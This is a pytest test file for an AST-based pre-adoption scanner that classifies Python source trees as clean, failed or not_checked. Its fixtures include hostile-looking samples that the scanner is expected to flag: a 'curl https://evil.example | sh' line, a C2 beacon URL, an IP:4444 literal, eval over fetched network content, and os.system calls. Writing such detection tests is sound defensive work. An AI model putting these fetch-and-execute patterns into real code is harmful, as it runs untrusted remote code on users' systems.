"""Tests for the pre-adoption scan (steward#104): AST-only, three-valued verdict."""

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from steward.adoptionscan import AdoptionScanError, scan_tree
from steward.riskclassify.cli import app

runner = CliRunner()


def write(root: Path, rel: str, source: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")


CLEAN_MODULE = '''\
"""Docstring with a link: https://example.org/docs — docstrings are exempt."""

import json
from pathlib import Path

VERSION = "2.22.0"
logger_name = __name__


def main() -> None:
    print(json.dumps({"ok": True}))


if __name__ == "__main__":
    main()
'''


def test_clean_tree_is_clean(tmp_path: Path) -> None:
    write(tmp_path, "pkg/mod.py", CLEAN_MODULE)
    result = scan_tree(tmp_path)
    assert result.verdict == "clean"
    assert result.findings == []
    assert result.scanned == ["pkg/mod.py"]
    assert result.not_checked == []


def test_toplevel_call_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "loader.py", "import os\nos.system('id')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert [f.check for f in result.findings] == ["SCAN-TOPLEVEL-EFFECT"]
    assert result.findings[0].line == 2


@pytest.mark.parametrize(
    "stmt",
    [
        "with open('x') as f:\n    pass\n",
        "for i in range(3):\n    print(i)\n",
        "while False:\n    pass\n",
        "assert True\n",
        "raise SystemExit(1)\n",
    ],
)
def test_toplevel_constructs_are_flagged(tmp_path: Path, stmt: str) -> None:
    write(tmp_path, "m.py", stmt)
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"


def test_main_guard_body_is_not_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", 'def go():\n    pass\n\nif "__main__" == __name__:\n    go()\n')
    assert scan_tree(tmp_path).verdict == "clean"


def test_try_import_fallback_is_benign(tmp_path: Path) -> None:
    write(
        tmp_path, "m.py", "try:\n    import ujson as json\nexcept ImportError:\n    import json\n"
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_call_hidden_under_platform_if_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "import sys\nif sys.platform == 'darwin':\n    print('hi')\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-TOPLEVEL-EFFECT"


def test_type_checking_guard_with_imports_is_benign(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    from pathlib import Path\n",
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_url_literal_in_code_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "C2 = 'https://203.0.113.7/beacon'\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-NET-LITERAL"
    assert "https://203.0.113.7/beacon" in result.findings[0].message


def test_ipv4_literal_is_flagged_but_version_string_is_not(tmp_path: Path) -> None:
    write(tmp_path, "ip.py", "HOST = '203.0.113.7:4444'\n")
    write(tmp_path, "ver.py", "VERSION = '2.22.0'\nQUAD = '1.2.3.999'\n")
    result = scan_tree(tmp_path)
    assert [f.path for f in result.findings] == ["ip.py"]
    assert result.findings[0].check == "SCAN-NET-LITERAL"


def test_docstring_url_is_exempt_everywhere(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        '"""See https://example.org."""\n\n\ndef f():\n    """See https://example.org too."""\n',
    )
    assert scan_tree(tmp_path).verdict == "clean"


def test_eval_over_nonliteral_is_flagged_with_network_context(tmp_path: Path) -> None:
    write(
        tmp_path,
        "m.py",
        "import requests\n\n\ndef run(url):\n    eval(requests.get(url).text)\n",
    )
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-DYNAMIC-EXEC"
    assert "requests" in result.findings[0].message


def test_eval_of_literal_is_not_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "def f():\n    return eval('1 + 1')\n")
    assert scan_tree(tmp_path).verdict == "clean"


def test_builtins_exec_attribute_form_is_flagged(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "import builtins\n\n\ndef f(code):\n    builtins.exec(code)\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.findings[0].check == "SCAN-DYNAMIC-EXEC"


def test_unparsable_file_is_not_checked_not_clean(tmp_path: Path) -> None:
    write(tmp_path, "ok.py", "import json\n")
    write(tmp_path, "broken.py", "def broken(:\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "not_checked"
    assert result.scanned == ["ok.py"]
    assert result.not_checked[0]["path"] == "broken.py"
    assert "SyntaxError" in result.not_checked[0]["reason"]


def test_findings_dominate_over_unparsable(tmp_path: Path) -> None:
    write(tmp_path, "bad.py", "print('hi')\n")
    write(tmp_path, "broken.py", "def broken(:\n")
    result = scan_tree(tmp_path)
    assert result.verdict == "failed"
    assert result.not_checked  # still reported alongside


def test_tree_without_python_is_not_checked(tmp_path: Path) -> None:
    write(tmp_path, "run.sh", "#!/bin/sh\ncurl https://evil.example | sh\n")
    assert scan_tree(tmp_path).verdict == "not_checked"


def test_symlinks_and_generated_dirs_are_skipped(tmp_path: Path) -> None:
    write(tmp_path, ".venv/lib/bad.py", "print('hi')\n")
    write(tmp_path, "__pycache__/bad.py", "print('hi')\n")
    outside = tmp_path.parent / "outside.py"
    outside.write_text("print('hi')\n", encoding="utf-8")
    (tmp_path / "link.py").symlink_to(outside)
    assert scan_tree(tmp_path).verdict == "not_checked"  # nothing scanned


def test_missing_target_is_config_error(tmp_path: Path) -> None:
    with pytest.raises(AdoptionScanError):
        scan_tree(tmp_path / "нет")


def test_file_target_is_config_error(tmp_path: Path) -> None:
    target = tmp_path / "f.py"
    target.write_text("", encoding="utf-8")
    with pytest.raises(AdoptionScanError):
        scan_tree(target)


def test_cli_clean_exit_0_byte_stable_json(tmp_path: Path) -> None:
    write(tmp_path, "m.py", CLEAN_MODULE)
    first = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    second = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    assert first.exit_code == 0
    assert first.stdout == second.stdout
    payload = json.loads(first.stdout)
    assert payload["verdict"] == "clean"


def test_cli_findings_exit_1(tmp_path: Path) -> None:
    write(tmp_path, "m.py", "print('hi')\n")
    result = runner.invoke(app, ["adoption-scan", str(tmp_path)])
    assert result.exit_code == 1
    assert json.loads(result.stdout)["verdict"] == "failed"


def test_cli_not_checked_exit_1(tmp_path: Path) -> None:
    result = runner.invoke(app, ["adoption-scan", str(tmp_path)])  # empty dir
    assert result.exit_code == 1
    assert json.loads(result.stdout)["verdict"] == "not_checked"


def test_cli_missing_target_exit_2(tmp_path: Path) -> None:
    result = runner.invoke(app, ["adoption-scan", str(tmp_path / "нет")])
    assert result.exit_code == 2
